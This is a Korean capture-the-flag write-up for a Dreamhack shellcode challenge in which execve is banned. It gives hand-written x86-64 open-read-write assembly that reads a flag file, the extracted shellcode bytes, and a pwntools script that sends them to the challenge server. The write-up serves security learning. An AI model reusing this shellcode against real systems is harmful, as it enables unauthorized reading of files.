직접 쉘코드를 짜보는 식으로 진행.

main 함수를 살펴보면 execve 시스템콜은 막혀있고

read(0, shellcode, 0x1000);
을 통해 STDIN을 나타태는 0을 통해 사용자에게 인풋을 받아서 그걸 쉘코드로 인식하는구나. 라고 알 수 있다.

void main(int argc, char *argv[]) {
char *shellcode = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);  
 void (\*sc)();

init();

banned_execve();

printf("shellcode: ");
read(0, shellcode, 0x1000);

sc = (void \*)shellcode;
sc();
}

execve를 사용하지 못하기 때문에 orw 쉘코드를 이용해서 있는 플래그를 읽어들여야겠다는 생각을 했다.

바뀐 점은 open 시스템 콜에서 파일 이름뿐이므로 자세한 설명은 하지않겠다.

다만 염두해야할 점은 8바이트의 데이터이기 때문에 push로 스택에 넘겨줄때 문자열의 끝을 알려주는 NULL을 추가해주어야 한다.

<write.asm>

section .text
global \_start
\_start:
push 0x0 ;terminator
mov rax, 0x676E6F6F6F6F6F6F ;oooooong
push rax
mov rax, 0x6C5F73695F656D61 ;ame_is_l
push rax
mov rax, 0x6E5F67616C662F63 ;c/flag_n
push rax
mov rax, 0x697361625F6C6C65 ;ell_basi
push rax
mov rax, 0x68732F656D6F682F ;/home/sh
push rax

    mov rdi, rsp
    mov rsi, 0
    mov rdx, 0
    mov rax, 2
    syscall

    mov rdi, rax
    mov rsi, rsp
    sub rsi, 0x29
    mov rdx, 0x29
    mov rax, 0
    syscall

    mov rdi, 1
    mov rax, 1
    syscall

이제 이걸 예제 파일에서 확인한 것처럼 nasm과 objcopy를 통해서 바이트 코드를 알아낸다.(사실 어셈블리 파일이 아닌 실행파일 자체를 objdump를 통해서 run_sh()에 해당하는 부분을 찾아낸 뒤 바이트코드를 일일히 옮기는 방법도 있지만, 쉽게 바이트코드를 옮기려고 write.asm으로 작성했다.)

그걸 "shellcode: " 라고 물어봤을때 입력값으로 주면 된다. 쉽게 전달하기 위해 파이썬으로 바이트코드를 추출했다.

#!/usr/bin/env python3
file_path="./write.bin"

with open(file_path,"rb") as file:
machine_code=file.read()
for byte in machine_code:
print("\\x{:02x}".format(byte),end='')
print()
이 파일을 통해서

\x6a\x00\x48\xb8\x6f\x6f\x6f\x6f\x6f\x6f\x6e\x67\x50\x48\xb8\x61\x6d\x65\x5f\x69\x73\x5f\x6c\x50\x48\xb8\x63\x2f\x66\x6c\x61\x67\x5f\x6e\x50\x48\xb8\x65\x6c\x6c\x5f\x62\x61\x73\x69\x50\x48\xb8\x2f\x68\x6f\x6d\x65\x2f\x73\x68\x50\x48\x89\xe7\xbe\x00\x00\x00\x00\xba\x00\x00\x00\x00\xb8\x02\x00\x00\x00\x0f\x05\x48\x89\xc7\x48\x89\xe6\x48\x83\xee\x29\xba\x29\x00\x00\x00\xb8\x00\x00\x00\x00\x0f\x05\xbf\x01\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05

입력하기 쉬운 형태로 변환했다.

이제 이렇게 분석한 코드를 어떻게 넣어야할까? 사실 문제를 푸는 부분보다 서버에 접속해서 어떻게 문제에 대한 답을 전달해야되는지에 대한 고민으로 낭비한 시간이 더 길었던 것 같다.

예제 파일 밑에 있는 접속정보를 클릭하면 vm 서버 호스트정보와 A/tcp -> B/tcp 라는 정보가 있다. A포트가 외부적으로 공개된 포트이고 B는 내부적으로 알아서 포워딩되는 포트이기 때문에 A포트를 사용하면 된다.

서버에 접속하기 위해서 python의 pwntools라는 툴을 사용하여 원격 접속한다.

#!/usr/bin/env python3
from pwn import \*

context.arch="amd64"
p=remote("host3.dreamhack.games",9689)

shellcode=b"\x6a\x00\x48\xb8\x6f\x6f\x6f\x6f\x6f\x6f\x6e\x67\x50\x48\xb8\x61\x6d\x65\x5f\x69\x73\x5f\x6c\x50\x48\xb8\x63\x2f\x66\x6c\x61\x67\x5f\x6e\x50\x48\xb8\x65\x6c\x6c\x5f\x62\x61\x73\x69\x50\x48\xb8\x2f\x68\x6f\x6d\x65\x2f\x73\x68\x50\x48\x89\xe7\xbe\x00\x00\x00\x00\xba\x00\x00\x00\x00\xb8\x02\x00\x00\x00\x0f\x05\x48\x89\xc7\x48\x89\xe6\x48\x83\xee\x29\xba\x29\x00\x00\x00\xb8\x00\x00\x00\x00\x0f\x05\xbf\x01\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05"
p.sendlineafter("shellcode: ",shellcode)
print(p.recv())

이 파일을 실행시키기만 하면 플래그가 나온다.
